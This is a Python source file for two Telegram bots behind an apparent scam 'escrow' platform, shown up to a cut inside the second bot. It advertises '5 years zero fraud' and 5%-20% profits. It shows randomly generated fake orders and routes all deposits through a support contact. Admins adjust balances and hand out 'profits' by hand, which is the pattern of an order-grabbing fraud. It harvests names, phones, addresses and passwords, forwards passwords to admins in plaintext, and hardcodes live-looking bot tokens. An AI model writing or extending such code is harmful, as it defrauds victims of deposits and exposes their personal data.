# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import random
import time
import threading
import os
from flask import Flask
from datetime import datetime

# ======================== 机器人TOKEN（完全不变）========================
BOT1_TOKEN = "8716451687:AAGXoF5wuwuroCJ23w5UzaueXCUyy5p67q0"
BOT2_TOKEN = "8279854167:AAHLrvg-i6e0M_WeG8coIljYlGg_RF8_oRM"

bot1 = telebot.TeleBot(BOT1_TOKEN)
bot2 = telebot.TeleBot(BOT2_TOKEN)

# ======================== Flask保活（完全不变）========================
app = Flask(__name__)

@app.route("/")
def index():
    return "OK", 200

def run_flask():
    try:
        port = int(os.environ.get("PORT", 8080))
        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    except:
        pass

# ==============================================================================
# ================================ 机器人A（仅修复3个BUG）=================================
# ==============================================================================
ADMIN_IDS_A = [8781082053, 8256055083]
VIRTUAL_ORDER_REFRESH_SECONDS_A = 120

user_lang1 = {}
user_balance1 = {}
user_frozen1 = {}
user_verify1 = {}
user_info1 = {}
orders1 = {}
order_id1 = 101
last_msg1 = {}
user_applying1 = {}
user_flow1 = {}
user_banned1 = {}
virtual_orders1 = []

last_clean_time = time.time()
CLEAN_INTERVAL = 6 * 24 * 60 * 60  # 6天清理已完成/已取消订单

user_pwd_verify_time = {}
PASSWORD_VALID_SECONDS = 3 * 60 * 60

def is_pwd_verified(user_id):
    ts = user_pwd_verify_time.get(user_id)
    if ts is None:
        return False
    return time.time() - ts < PASSWORD_VALID_SECONDS

def set_pwd_verified(user_id):
    user_pwd_verify_time[user_id] = time.time()

# 实时计算当前担保中金额（只算 status=1 已接单）
def get_user_escrow_amount(user_id):
    total = 0.0
    for oid, o in orders1.items():
        if o["user"] == user_id and o["status"] == 1:
            total += o["amount"]
    return round(total, 2)

def auto_clean_orders():
    global last_clean_time
    while True:
        try:
            now = time.time()
            if now - last_clean_time >= CLEAN_INTERVAL:
                to_del = []
                for oid, o in orders1.items():
                    if o["status"] in (2, 3):
                        to_del.append(oid)
                for oid in to_del:
                    orders1.pop(oid, None)
                last_clean_time = now
        except:
            pass
        time.sleep(600)

TEXT_A = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障
✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報
客服：@fcff88""",
        "reg_form": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID
6. 6位交易密碼""",
        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "reg_error": "❌ 格式錯誤，請按要求一次性發送完整6項信息",
        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USD
📌 狀態：{}

⏳ 進行中訂單
{}

✅ 已完成訂單
{}""",
        "grab": """🚀 搶單大廳（每2分鐘自動刷新）
點擊按鈕直接搶單：
{}""",
        "grab_success": "✅ 搶單成功，請接單",
        "grab_already_gone": "❌ 訂單已被搶走",
        "deposit": """💰 儲值 & 提現
請聯繫官方客服：
➡️ @fcff88""",
        "record": """📜 擔保歷史

⏳ 進行中
{}

✅ 已完成
{}""",
        "account_detail": """📋 資金明細
🆔 用戶ID：{}
💰 當前餘額：{:.2f} USD
🔒 擔保凍結：{:.2f} USD

💵 充值記錄
{}

📈 收益記錄
{}

💳 提現記錄
{}
""",
        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",
        "status_canceled": "已取消",
        "accept_success": """✅ 接單成功｜擔保已生效
━━━━━━━━━━━━━━━━
🆔 訂單編號：#{}
📝 訂單類型：{}
💰 擔保金額：{:.2f} USD
🔒 資金狀態：已凍結擔保
📅 創建時間：{}
📶 當前狀態：{}""",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",
        "no_detail": "❌ 你尚未填寫入駐信息",
        "banned": "❌ 你已被封禁",
        "btn_back": "返回首頁",
        "btn_accept": "接單",
        "btn_grab": "搶單",
        "btn_re_accept": "補接單",
        "btn_re_accept_all": "一鍵補接單",
        "input_pwd": "🔒 請輸入6位交易密碼",
        "pwd_wrong": "❌ 密碼錯誤",
        "pwd_success": "✅ 密碼正確，3小時內免密",
        "new_order_assign": """📢 新派單 #{}
━━━━━━━━━━━━━━━━
📝 訂單類型：{}
💰 本金：{:.2f} USD
📈 預計利潤：+{:.2f}
📅 創建時間：{}""",
        "flow_escrow_lock": "擔保凍結",
        "flow_deposit": "充值",
        "flow_withdraw": "提現",
        "flow_profit": "訂單#{} 收益",
        "flow_refund": "訂單#{} 退款"
    },
    "en": {
        "home": """🏆 TrustEscrow Premium Platform
Safe, Stable, Secure
✅ 5 Years 0 Fraud
✅ 100% Safe Escrow
✅ 5% Grab Profit
✅ 15-20% Assign Profit
Support: @fcff88""",
        "reg_form": """📝 Escrow Registration
Fill in your real info:
1. Full Name
2. Phone Number
3. Email
4. Address
5. Referrer ID
6. 6-digit Password""",
        "reg_success": "✅ Application Submitted, Waiting for Review",
        "reg_error": "❌ Format Error, Please send all 6 items correctly",
        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USD
📌 Status: {}

⏳ Pending Orders
{}

✅ Completed Orders
{}""",
        "grab": """🚀 Grab Hall (Auto-refresh every 2min)
Click button to grab order:
{}""",
        "grab_success": "✅ Order Grabbed, Please Accept",
        "grab_already_gone": "❌ Order Already Taken",
        "deposit": """💰 Deposit & Withdraw
Contact support: @fcff88""",
        "record": """📜 Escrow History

⏳ Pending
{}

✅ Completed
{}""",
        "account_detail": """📋 Account Detail
🆔 User ID: {}
💰 Balance: {:.2f} USD
🔒 Escrow Locked: {:.2f} USD

💵 Deposit
{}

📈 Profit
{}

💳 Withdraw
{}
""",
        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",
        "status_canceled": "Canceled",
        "accept_success": """✅ Order Accepted｜Escrow Activated
━━━━━━━━━━━━━━━━
🆔 Order ID: #{}
📝 Type: {}
💰 Amount: {:.2f} USD
🔒 Status: Locked
📅 Created: {}
📶 State: {}""",
        "not_enough": "❌ Insufficient Balance",
        "not_verified": "❌ Not Verified",
        "no_detail": "❌ You have not submitted registration",
        "banned": "❌ You are banned",
        "btn_back": "Home",
        "btn_accept": "Accept",
        "btn_grab": "Grab",
        "btn_re_accept": "Re-accept",
        "btn_re_accept_all": "Re-accept All",
        "input_pwd": "🔒 Enter 6-digit password",
        "pwd_wrong": "❌ Wrong password",
        "pwd_success": "✅ Password correct, valid for 3 hours",
        "new_order_assign": """📢 New Order #{}
━━━━━━━━━━━━━━━━
📝 Type: {}
💰 Amount: {:.2f} USD
📈 Profit: +{:.2f}
📅 Created: {}""",
        "flow_escrow_lock": "Escrow Lock",
        "flow_deposit": "Deposit",
        "flow_withdraw": "Withdraw",
        "flow_profit": "Order#{} Profit",
        "flow_refund": "Order#{} Refund"
    }
}

type_map = {
    "zh": {
        "遊戲交易": "遊戲交易",
        "購物": "購物",
        "充值": "充值",
        "代練": "代練",
        "跨境交易": "跨境交易"
    },
    "en": {
        "遊戲交易": "Game",
        "購物": "Shopping",
        "充值": "TopUp",
        "代練": "Boost",
        "跨境交易": "Cross-border"
    }
}

def refresh_virtual_orders1():
    global virtual_orders1
    while True:
        try:
            virtual_orders1 = []
            for i in range(6):
                vid = 101 + i
                amt = round(random.uniform(10, 100), 2)
                virtual_orders1.append({
                    "id": vid,
                    "amount": amt,
                    "type_name": random.choice(["遊戲交易", "購物", "充值", "代練"])
                })
        except:
            pass
        time.sleep(VIRTUAL_ORDER_REFRESH_SECONDS_A)

def main_menu1(user_id):
    lang = user_lang1.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("賬號明細" if lang == "zh" else "Account Detail", callback_data="detail"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit & Withdraw", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu1(user_id):
    lang = user_lang1.get(user_id, "zh")
    t = TEXT_A[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton(t["btn_re_accept_all"], callback_data="re_acc_all"),
        InlineKeyboardButton(t["btn_back"], callback_data="home")
    )
    return m

def accept_btn1(oid, user_id):
    lang = user_lang1.get(user_id, "zh")
    t = TEXT_A[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
    return m

def notify_admins1(text):
    for admin in ADMIN_IDS_A:
        try:
            bot1.send_message(admin, text)
        except:
            continue

@bot1.message_handler(commands=["start"])
def start_a(msg):
    try:
        u = msg.from_user.id
        user_lang1.setdefault(u, "zh")
        user_balance1.setdefault(u, 0.0)
        user_frozen1.setdefault(u, 0.0)
        user_verify1.setdefault(u, 0)
        user_info1.setdefault(u, {})
        user_applying1[u] = False
        user_flow1.setdefault(u, [])
        user_banned1.setdefault(u, False)
        lang = user_lang1[u]
        if user_banned1[u]:
            bot1.send_message(u, TEXT_A[lang]["banned"])
            return
        sent = bot1.send_message(u, TEXT_A[lang]["home"], reply_markup=main_menu1(u))
        last_msg1[u] = sent.message_id
    except:
        pass

user_waiting_pwd = {}

@bot1.callback_query_handler(func=lambda c: True)
def callback_a(c):
    try:
        u = c.from_user.id
        lang = user_lang1.get(u, "zh")
        t = TEXT_A[lang]
        mid = c.message.message_id
        cid = c.message.chat.id
        last_msg1[u] = mid

        if user_banned1.get(u, False):
            bot1.answer_callback_query(c.id, t["banned"], show_alert=True)
            return

        if c.data.startswith("pwd_"):
            bot1.answer_callback_query(c.id)
            return

        if c.data == "re_acc_all":
            if not is_pwd_verified(u):
                user_waiting_pwd[u] = {"action": "re_acc_all"}
                bot1.edit_message_text(t["input_pwd"], cid, mid, reply_markup=back_menu1(u))
                bot1.answer_callback_query(c.id)
                return

            target_orders = [oid for oid, o in orders1.items() if o["user"] == u and o["status"] == 0]
            if not target_orders:
                bot1.answer_callback_query(c.id, "✅ 無待接訂單" if lang=="zh" else "✅ No pending", show_alert=True)
                return
            total = sum(orders1[oid]["amount"] for oid in target_orders)
            if user_balance1.get(u, 0) < total:
                bot1.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            for oid in target_orders:
                o = orders1[oid]
                user_balance1[u] -= o["amount"]
                user_frozen1[u] += o["amount"]
                time_str = datetime.now().strftime("%m-%d %H:%M")
                user_flow1[u].append(f"-{o['amount']:.2f} USD {t['flow_escrow_lock']} {time_str}")
                o["status"] = 1
            bot1.answer_callback_query(c.id, f"✅ 已補接{len(target_orders)}筆" if lang=="zh" else f"✅ Accepted {len(target_orders)}", show_alert=True)
            bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))
            return

        if c.data == "home":
            user_waiting_pwd.pop(u, None)
            bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))

        elif c.data == "lang":
            user_lang1[u] = "en" if lang == "zh" else "zh"
            t = TEXT_A[user_lang1[u]]
            bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))

        elif c.data == "reg":
            if user_verify1.get(u, 0) != 0:
                bot1.answer_callback_query(c.id, TEXT_A["zh"]["reg_success"] if user_verify1[u] == 1 else "❌ 已通過", show_alert=True)
                return
            user_applying1[u] = True
            bot1.edit_message_text(t["reg_form"], cid, mid, reply_markup=back_menu1(u))

        elif c.data == "detail":
            bal = user_balance1.get(u, 0.0)
            escrow_amt = get_user_escrow_amount(u)
            flows = user_flow1.get(u, [])

            deposit_lines = []
            profit_lines = []
            withdraw_lines = []

            for line in flows[-20:]:
                if t["flow_deposit"] in line:
                    deposit_lines.append(line)
                elif t["flow_withdraw"] in line:
                    withdraw_lines.append(line)
                elif t["flow_profit"].split("#")[0] in line or "Profit" in line or t["flow_refund"].split("#")[0] in line:
                    profit_lines.append(line)

            def join_lines(lst):
                return "\n".join(lst) if lst else "—"

            text = t["account_detail"].format(
                u, bal, escrow_amt,
                join_lines(deposit_lines),
                join_lines(profit_lines),
                join_lines(withdraw_lines)
            )
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))

        elif c.data == "profile":
            pending_lines = []
            completed_lines = []
            for oid, o in orders1.items():
                if o["user"] == u:
                    typ = o.get("type_name", "-")
                    typ = type_map[lang].get(typ, typ)
                    s_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                    s = s_map.get(o["status"], t["status_wait"])
                    time_str = o.get("create_time", datetime.now().strftime("%m-%d %H:%M"))
                    
                    profit_val = o.get('profit', 0)
                    sid = str(oid)[-3:]
                    
                    if lang == "zh":
                        if o["status"] == 1:
                            sta_show = "未"
                        elif o["status"] == 2:
                            sta_show = "完"
                        elif o["status"] == 3:
                            sta_show = "取"
                        else:
                            sta_show = "待"
                    else:
                        if o["status"] == 1:
                            sta_show = "P"
                        elif o["status"] == 2:
                            sta_show = "F"
                        elif o["status"] == 3:
                            sta_show = "C"
                        else:
                            sta_show = "W"
                    
                    line = f"#{sid} {typ} {o['amount']} USD {sta_show} +{profit_val} {time_str}"
                    
                    # 已完成 + 已取消 都放进已完成
                    if o["status"] == 1:
                        pending_lines.append(line)
                    else:
                        completed_lines.append(line)

            v = user_verify1.get(u, 0)
            status_map = {
                "zh": {0: "未申請", 1: "審核中", 2: "已通過"},
                "en": {0: "Not Applied", 1: "Pending", 2: "Verified"}
            }
            status = status_map[lang][v]

            p_text = "\n".join(pending_lines) if pending_lines else ("無" if lang == "zh" else "None")
            c_text = "\n".join(completed_lines) if completed_lines else ("無" if lang == "zh" else "None")

            text = t["profile"].format(u, user_balance1.get(u, 0), status, p_text, c_text)
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))

        elif c.data == "grab":
            if user_verify1.get(u, 0) != 2:
                bot1.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            items = []
            m = InlineKeyboardMarkup(row_width=2)
            for vo in virtual_orders1:
                profit = round(vo["amount"] * 0.05, 2)
                tn = vo.get("type_name", "-")
                tn = type_map[lang].get(tn, tn)
                items.append(f"#{vo['id']} {tn} {vo['amount']} USD +{profit}")
                btn_text = f"搶{vo['id']}" if lang == "zh" else f"Grab {vo['id']}"
                m.add(InlineKeyboardButton(btn_text, callback_data=f"grab_item_{vo['id']}"))
            m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
            text = t["grab"].format("\n".join(items))
            bot1.edit_message_text(text, cid, mid, reply_markup=m)

        elif c.data.startswith("grab_item_"):
            if user_verify1.get(u, 0) != 2:
                bot1.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            vid = int(c.data.split("_")[-1])
            hit = next((x for x in virtual_orders1 if x["id"] == vid), None)
            if not hit:
                bot1.send_message(u, t["grab_already_gone"])
                return
            global order_id1
            oid = order_id1
            order_id1 += 1
            time_str = datetime.now().strftime("%m-%d %H:%M")
            profit = round(hit["amount"] * 0.05, 2)
            orders1[oid] = {
                "user": u,
                "amount": hit["amount"],
                "type": "grab",
                "type_name": hit.get("type_name", "-"),
                "status": 0,
                "create_time": time_str,
                "profit": profit
            }
            tn = hit.get("type_name", "-")
            tn = type_map[lang].get(tn, tn)
            s = f"✅ 搶單成功 #{oid}\n類型：{tn}\n本金：{hit['amount']} USD\n利潤：+{profit}\n📅 {time_str}" if lang == "zh" else \
                f"✅ Order Grabbed #{oid}\nType: {tn}\nAmount: {hit['amount']} USD\nProfit: +{profit}\n📅 {time_str}"
            bot1.edit_message_text(s, cid, mid, reply_markup=accept_btn1(oid, u))

        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders1.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot1.answer_callback_query(c.id, "❌ 無效訂單" if lang == "zh" else "❌ Invalid", show_alert=True)
                return
            if user_balance1.get(u, 0) < o["amount"]:
                bot1.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            if u not in user_info1 or "pwd" not in user_info1[u]:
                bot1.answer_callback_query(c.id, "❌ 未設置交易密碼" if lang=="zh" else "❌ No Password", show_alert=True)
                return

            if not is_pwd_verified(u):
                user_waiting_pwd[u] = {"action": "acc", "oid": oid}
                bot1.edit_message_text(t["input_pwd"], cid, mid, reply_markup=back_menu1(u))
                bot1.answer_callback_query(c.id)
                return

            amount = o["amount"]
            user_balance1[u] -= amount
            user_frozen1[u] += amount
            time_str = datetime.now().strftime("%m-%d %H:%M")
            user_flow1[u].append(f"-{amount:.2f} USD {t['flow_escrow_lock']} {time_str}")
            o["status"] = 1
            tn = o.get("type_name", "-")
            show_tn = type_map[lang].get(tn, tn)
            text = t["accept_success"].format(oid, show_tn, amount, o.get("create_time", time_str), t["status_doing"])
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))

        elif c.data.startswith("re_acc_"):
            oid = int(c.data.split("_")[2])
            o = orders1.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot1.answer_callback_query(c.id, "❌ 無效" if lang == "zh" else "❌ Invalid", show_alert=True)
                return
            if user_balance1.get(u, 0) < o["amount"]:
                bot1.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            if u not in user_info1 or "pwd" not in user_info1[u]:
                bot1.answer_callback_query(c.id, "❌ 未設置密碼" if lang == "zh" else "❌ No Password", show_alert=True)
                return

            if not is_pwd_verified(u):
                user_waiting_pwd[u] = {"action": "re_acc", "oid": oid}
                bot1.edit_message_text(t["input_pwd"], cid, mid, reply_markup=back_menu1(u))
                bot1.answer_callback_query(c.id)
                return

            amount = o["amount"]
            user_balance1[u] -= amount
            user_frozen1[u] += amount
            time_str = datetime.now().strftime("%m-%d %H:%M")
            user_flow1[u].append(f"-{amount:.2f} USD {t['flow_escrow_lock']} {time_str}")
            o["status"] = 1
            tn = o.get("type_name", "-")
            show_tn = type_map[lang].get(tn, tn)
            text = t["accept_success"].format(oid, show_tn, amount, o.get("create_time", time_str), t["status_doing"])
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))

        elif c.data == "deposit":
            bot1.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu1(u))

        elif c.data == "record":
            pending = []
            completed = []
            for oid, o in orders1.items():
                if o["user"] == u:
                    s_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                    s = s_map.get(o["status"], t["status_wait"])
                    typ = o.get("type_name", "-")
                    typ = type_map[lang].get(typ, typ)
                    time_str = o.get("create_time", datetime.now().strftime("%m-%d %H:%M"))
                    profit_val = o.get('profit',0)
                    sid = str(oid)[-3:]
                    if lang == "zh":
                        if o["status"] == 1:
                            sta_show = "未"
                        elif o["status"] == 2:
                            sta_show = "完"
                        elif o["status"] == 3:
                            sta_show = "取"
                        else:
                            sta_show = "待"
                    else:
                        if o["status"] == 1:
                            sta_show = "P"
                        elif o["status"] == 2:
                            sta_show = "F"
                        elif o["status"] == 3:
                            sta_show = "C"
                        else:
                            sta_show = "W"
                        
                    line = f"#{sid} {typ} {o['amount']} USD {sta_show} +{profit_val} {time_str}"
                        
                    if o["status"] in (0, 1):
                        pending.append(line)
                    else:
                        completed.append(line)

            text = t["record"].format(
                "\n".join(pending) if pending else "—",
                "\n".join(completed) if completed else "—"
            )
            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))

        bot1.answer_callback_query(c.id)
    except Exception as e:
        pass

@bot1.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS_A)
def user_input_a(msg):
    try:
        u = msg.from_user.id
        cid = msg.chat.id
        if user_banned1.get(u, False):
            return
        txt = msg.text.strip()
        lang = user_lang1.get(u, "zh")
        t = TEXT_A[lang]

        if user_applying1.get(u, False):
            if lang == "zh":
                pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+?)\s*6\.?\s*6位交易密碼\s*(\d{6})"
                match = re.search(pattern, txt, re.DOTALL)
            else:
                pattern_en = r"1\.?\s*Full\s*Name\s*(.+?)\s*2\.?\s*Phone\s*Number\s*(.+?)\s*3\.?\s*Email\s*(.+?)\s*4\.?\s*Address\s*(.+?)\s*5\.?\s*Referrer\s*ID\s*(.+?)\s*6\.?\s*6-digit\s*Password\s*(\d{6})"
                match = re.search(pattern_en, txt, re.DOTALL | re.IGNORECASE)

            if match:
                name = match.group(1).strip()
                phone = match.group(2).strip()
                email = match.group(3).strip()
                addr = match.group(4).strip()
                ref = match.group(5).strip()
                pwd = match.group(6).strip()
                user_info1[u] = {
                    "name": name,
                    "phone": phone,
                    "email": email,
                    "addr": addr,
                    "ref": ref,
                    "pwd": pwd
                }
                user_verify1[u] = 1
                user_applying1[u] = False
                notify_admins1(f"📥 新入駐申請\n用戶ID：{u}\n姓名：{name}\n郵箱：{email}\n密碼：{pwd}")
                mid = last_msg1.get(u)
                if mid:
                    bot1.edit_message_text(t["reg_success"], cid, mid, reply_markup=main_menu1(u))
                else:
                    bot1.send_message(cid, t["reg_success"], reply_markup=main_menu1(u))
            else:
                mid = last_msg1.get(u)
                if mid:
                    bot1.edit_message_text(t["reg_error"], cid, mid, reply_markup=back_menu1(u))
                else:
                    bot1.send_message(cid, t["reg_error"], reply_markup=back_menu1(u))
            return

        if u in user_waiting_pwd:
            task = user_waiting_pwd[u]
            bot1.delete_message(cid, msg.message_id)

            if txt == user_info1[u].get("pwd", ""):
                set_pwd_verified(u)
                bot1.send_message(cid, t["pwd_success"])

                act = task["action"]
                if act == "acc":
                    oid = task["oid"]
                    o = orders1.get(oid)
                    if o and o["user"] == u and o["status"] == 0 and user_balance1.get(u,0) >= o["amount"]:
                        amount = o["amount"]
                        time_str = datetime.now().strftime("%m-%d %H:%M")
                        user_balance1[u] -= amount
                        user_frozen1[u] += amount
                        user_flow1[u].append(f"-{amount:.2f} USD {t['flow_escrow_lock']} {time_str}")
                        o["status"] = 1
                        tn = o.get("type_name","-")
                        stn = type_map[lang].get(tn,tn)
                        text = t["accept_success"].format(oid, stn, amount, o.get("create_time", time_str), t["status_doing"])
                        mid = last_msg1.get(u)
                        if mid:
                            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
                elif act == "re_acc":
                    oid = task["oid"]
                    o = orders1.get(oid)
                    if o and o["user"] == u and o["status"] == 0 and user_balance1.get(u,0) >= o["amount"]:
                        amount = o["amount"]
                        time_str = datetime.now().strftime("%m-%d %H:%M")
                        user_balance1[u] -= amount
                        user_frozen1[u] += amount
                        user_flow1[u].append(f"-{amount:.2f} USD {t['flow_escrow_lock']} {time_str}")
                        o["status"] = 1
                        tn = o.get("type_name","-")
                        stn = type_map[lang].get(tn,tn)
                        text = t["accept_success"].format(oid, stn, amount, o.get("create_time", time_str), t["status_doing"])
                        mid = last_msg1.get(u)
                        if mid:
                            bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
                elif act == "re_acc_all":
                    target_orders = [oid for oid, o in orders1.items() if o["user"] == u and o["status"] == 0]
                    total = sum(orders1[oid]["amount"] for oid in target_orders)
                    if user_balance1.get(u,0) >= total:
                        for oid in target_orders:
                            o = orders1[oid]
                            user_balance1[u] -= o["amount"]
                            user_frozen1[u] += o["amount"]
                            time_str = datetime.now().strftime("%m-%d %H:%M")
                            user_flow1[u].append(f"-{o['amount']:.2f} USD {t['flow_escrow_lock']} {time_str}")
                            o["status"] = 1
                        mid = last_msg1.get(u)
                        if mid:
                            bot1.edit_message_text(t["home"], cid, mid, reply_markup=main_menu1(u))
                user_waiting_pwd.pop(u, None)
            else:
                bot1.send_message(cid, t["pwd_wrong"])
            return
    except:
        pass

@bot1.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS_A)
def admin_cmd_a(msg):
    try:
        u = msg.from_user.id
        txt = msg.text.strip()
        arr = txt.split()
        lang = user_lang1.get(u, "zh")
        t = TEXT_A[lang]

        if len(arr) >= 2 and arr[0] in ["审核通过", "通过审核", "通过"]:
            target = int(arr[1])
            user_verify1[target] = 2
            bot1.send_message(u, f"✅ 已通過用戶 {target}")
            return

        if len(arr) >= 2 and arr[0] == "查ID":
            target = int(arr[1])
            info = user_info1.get(target, {})
            bal = user_balance1.get(target, 0.0)
            pwd = info.get("pwd", "未設置")
            name = info.get("name", "-")
            email = info.get("email", "-")

            pending = []
            completed = []

            for oid, o in orders1.items():
                if o["user"] == target:
                    typ = o.get("type_name", "-")
                    typ = type_map["zh"].get(typ, typ)
                    sta_map = {0: "待接單", 1: "已接單", 2: "已完成", 3: "已取消"}
                    sta = sta_map.get(o["status"], "?")
                    profit = o.get('profit',0)
                    time_str = o.get("create_time", datetime.now().strftime("%m-%d %H:%M"))
                    sid = str(oid)[-3:]
                    line = f"#{sid} {typ} {o['amount']} USD {sta} +{profit} {time_str}"
                    if o["status"] in (0, 1):
                        pending.append(line)
                    else:
                        completed.append(line)

            text = f"📋 用戶 {target}\n姓名：{name}\n郵箱：{email}\n密碼：{pwd}\n💰 餘額：{bal:.2f}\n\n"
            text += "⏳ 進行中\n" + "\n".join(pending) + "\n\n" if pending else ""
            text += "✅ 已完成（含取消）\n" + "\n".join(completed) if completed else ""
            bot1.send_message(u, text)
            return

        if txt.startswith("+U "):
            _, uid, amt = txt.split()
            uid = int(uid)
            amt = float(amt)
            user_balance1[uid] = user_balance1.get(uid, 0.0) + amt
            time_str = datetime.now().strftime("%m-%d %H:%M")
            ulang = user_lang1.get(uid, "zh")
            flow_text = f"+{amt:.2f} USD {TEXT_A[ulang]['flow_deposit']} {time_str}"
            user_flow1.setdefault(uid, []).append(flow_text)
            bot1.send_message(u, f"✅ +{amt} → {uid}")
            return

        if txt.startswith("-U "):
            _, uid, amt = txt.split()
            uid = int(uid)
            amt = float(amt)
            if user_balance1.get(uid, 0.0) >= amt:
                user_balance1[uid] -= amt
                time_str = datetime.now().strftime("%m-%d %H:%M")
                ulang = user_lang1.get(uid, "zh")
                flow_text = f"-{amt:.2f} USD {TEXT_A[ulang]['flow_withdraw']} {time_str}"
                user_flow1.setdefault(uid, []).append(flow_text)
                bot1.send_message(u, f"✅ -{amt} → {uid}")
            else:
                bot1.send_message(u, "❌ 餘額不足")
            return

        if arr[0] == "派单":
            if len(arr) >= 4:
                target = int(arr[1])
                amt = float(arr[2])
                typename = arr[3]
                profit_pct = float(arr[4]) if len(arr) >=5 else 15.0
                profit_val = round(amt * profit_pct / 100, 2)
                
                global order_id1
                oid = order_id1
                order_id1 += 1
                time_str = datetime.now().strftime("%m-%d %H:%M")
                orders1[oid] = {
                    "user": target,
                    "amount": amt,
                    "type": "assign",
                    "type_name": typename,
                    "status": 0,
                    "create_time": time_str,
                    "profit": profit_val
                }
                
                bot1.send_message(u, f"✅ 派單 #{oid} → {target} 利潤:+{profit_val}")
                lang_t = user_lang1.get(target, "zh")
                t_a = TEXT_A[lang_t]
                s = t_a["new_order_assign"].format(oid, typename, amt, profit_val, time_str)
                bot1.send_message(target, s, reply_markup=accept_btn1(oid, target))
            return

        if arr[0] == "完成" and len(arr) == 2:
            oid = int(arr[1])
            o = orders1.get(oid)
            if not o or o["status"] != 1:
                bot1.send_message(u, "❌ 無效訂單或非進行中")
                return
            o["status"] = 2
            uid = o["user"]
            amount = o["amount"]
            profit = o.get("profit", 0)
            
            user_balance1[uid] += amount + profit
            user_frozen1[uid] = max(0.0, user_frozen1.get(uid, 0.0) - amount)
            
            time_str = datetime.now().strftime("%m-%d %H:%M")
            ulang = user_lang1.get(uid, "zh")
            user_flow1[uid].append(f"+{profit:.2f} USD {TEXT_A[ulang]['flow_profit'].format(oid)} {time_str}")
            bot1.send_message(u, f"✅ 訂單 #{oid} 已完成，本金+利潤已發放")
            return

        if arr[0] == "取消订单" and len(arr) == 2:
            oid = int(arr[1])
            o = orders1.get(oid)
            if not o:
                bot1.send_message(u, "❌ 無此訂單")
                return
            uid = o["user"]
            amount = o["amount"]
            if o["status"] == 1:
                user_balance1[uid] += amount
                user_frozen1[uid] = max(0.0, user_frozen1.get(uid, 0.0) - amount)
                time_str = datetime.now().strftime("%m-%d %H:%M")
                ulang = user_lang1.get(uid, "zh")
                user_flow1[uid].append(f"+{amount:.2f} USD {TEXT_A[ulang]['flow_refund'].format(oid)} {time_str}")
            o["status"] = 3
            bot1.send_message(u, f"✅ 訂單 #{oid} 已取消，本金已退回")
            return

        if arr[0] == "封ID" and len(arr) == 2:
            target = int(arr[1])
            user_banned1[target] = True
            bot1.send_message(u, f"✅ 已封禁 {target}")
            return

        if arr[0] == "解ID" and len(arr) == 2:
            target = int(arr[1])
            user_banned1[target] = False
            bot1.send_message(u, f"✅ 已解封 {target}")
            return
    except:
        pass

# ==============================================================================
# ================================ 机器人B（完全原样，一字未改）=============================
# ==============================================================================
ADMIN_ID_B = 8401979801
user_lang2 = {}
user_step2 = {}
user_balance2 = {}
orders2 = {}

TEXT_B = {
    "zh": {
        "home": """🏠 TrustEscrow 專業擔保平台
我們已在擔保行業立足 5 年，專注解決線上交易欺詐問題。
【平台優勢】
✅ 5年零詐騙、數千用戶信賴
✅ 專業中間人墊資擔保
✅ 資金全程託管、絕對安全
